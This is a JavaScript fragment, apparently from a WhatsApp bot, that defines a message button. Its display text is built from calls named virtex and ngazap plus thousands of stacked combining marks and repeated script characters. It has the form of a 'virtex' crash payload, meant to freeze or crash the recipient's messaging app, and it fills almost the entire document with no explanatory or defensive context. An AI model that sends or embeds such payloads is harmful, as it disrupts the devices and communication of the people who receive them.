					{buttonId: 'id1', buttonText: {displayText: `${virtex2(prefix)}${virtex7(prefix)}${virtex9(prefix)}${virtex7(prefix)}${virtex9(prefix)}${ngazap(prefix)}ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ᷽̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈־᷽־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰًًًًًࣰࣱࣱࣱٍ᳕ܾࣶࣶ֖֖᷽᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩۡ᪳ࣧࣧ᪳́ࣼ᳚᪳̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًًࣰًًًًً᳕ܾࣶࣶ֖֖᷽᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ֻࣰًًًًًࣰࣱࣱࣱٍ᳕ܾࣶࣶ֖֖᷽᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩۡ᪳ࣧࣧ᪳́ࣼ᳚᪳̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًًࣰًًًًً᳕ܾࣶࣶ֖֖᷽᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ